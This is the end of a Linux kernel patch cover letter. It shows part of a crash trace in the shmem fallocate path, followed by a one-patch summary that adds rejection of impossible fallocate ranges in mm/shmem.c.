[  306.809263][ T9406]  ? __pfx___might_resched (build/../kernel/sched/core.c:5888 (discriminator 7))
[  306.809826][ T9406]  shmem_fallocate (build/../mm/shmem.c:2670 (discriminator 1) build/../mm/shmem.c:3766 (discriminator 1))
[  306.810405][ T9406]  ? __pfx_shmem_fallocate (build/../include/linux/quotaops.h:26)
[  306.810991][ T9406]  ? register_lock_class (build/../kernel/locking/lockdep.c:1294)
[  306.811548][ T9406]  ? __lock_acquire (build/../kernel/locking/lockdep.c:4674 build/../kernel/locking/lockdep.c:5191)
[  306.812159][ T9406]  ? __pfx___file_has_perm (build/../security/selinux/include/objsec.h:186)
[  306.812714][ T9406]  ? vfs_write (build/../fs/read_write.c:680)
[  306.813189][ T9406]  ? __pfx_anon_pipe_write (build/../fs/pipe.c:145)
[  306.813750][ T9406]  ? __pfx___might_resched (build/../kernel/sched/core.c:5888 (discriminator 7))
[  306.814310][ T9406]  ? __pfx_shmem_fallocate (build/../include/linux/quotaops.h:26)
[  306.814855][ T9406]  vfs_fallocate (build/../fs/open.c:338)
[  306.815359][ T9406]  ? __pfx_vfs_fallocate (build/../fs/open.c:437)
[  306.815905][ T9406]  ? ksys_write (build/../fs/read_write.c:745)
[  306.816426][ T9406]  ? __pfx_ksys_write (build/../fs/read_write.c:724)
[  306.816946][ T9406]  __x64_sys_fallocate (build/../fs/open.c:362 build/../fs/open.c:367 build/../fs/open.c:365 build/../fs/open.c:365)
[  306.817511][ T9406]  do_syscall_64 (build/../arch/x86/entry/syscall_64.c:63 build/../arch/x86/entry/syscall_64.c:94)
[  306.818022][ T9406]  ? clear_bhb_loop (build/../arch/x86/entry/entry_64.S:1547)
[  306.818544][ T9406]  entry_SYSCALL_64_after_hwframe (build/../arch/x86/entry/entry_64.S:121)
[  306.819186][ T9406] RIP: 0033:0x7f7a21617fc9
[  306.819682][ T9406] Code: Unable to access opcode bytes at 0x7f7a21617f9f.

Code starting with the faulting instruction
===========================================
[  306.820432][ T9406] RSP: 002b:00007fff3e158718 EFLAGS: 00000246 ORIG_RAX: 000000000000011d
[  306.821279][ T9406] RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 00007f7a21617fc9
[  306.822368][ T9406] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000003
[  306.823201][ T9406] RBP: 0000558780fbe5e0 R08: 00007fff3e156485 R09: 0000000000000000
[  306.824087][ T9406] R10: 7fffffffffffffff R11: 0000000000000246 R12: 0000558780fbe360
[  306.824968][ T9406] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
[  306.825886][ T9406]  </TASK>
[  306.826967][ T9406] Kernel Offset: disabled
[  306.827539][ T9406] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  mm: shmem: reject impossible fallocate ranges

 mm/shmem.c | 25 ++++++++++++++++---------
 1 file changed, 16 insertions(+), 9 deletions(-)

-- 
2.43.0

